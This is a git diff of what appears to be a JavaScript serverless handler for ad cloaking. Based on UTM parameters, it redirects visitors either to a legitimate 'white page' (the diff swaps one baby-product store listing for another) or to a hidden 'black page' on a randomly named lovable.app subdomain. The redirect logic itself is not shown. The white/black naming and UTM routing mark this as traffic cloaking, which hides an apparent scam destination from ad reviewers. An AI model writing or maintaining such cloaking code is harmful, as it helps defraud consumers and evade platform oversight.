@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://en.scandinavianbaby.pl/product-eng-35761-Wozek-spacerowy-Thule-Spring-Black-Soft-Beige.html";
+    const whitePageURL = "https://leander.com/product-detail/leander-wally-wall-mounted-changing-table-550010-77";
     const blackPageURL = "https://wherlnquz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,4 +26,5 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
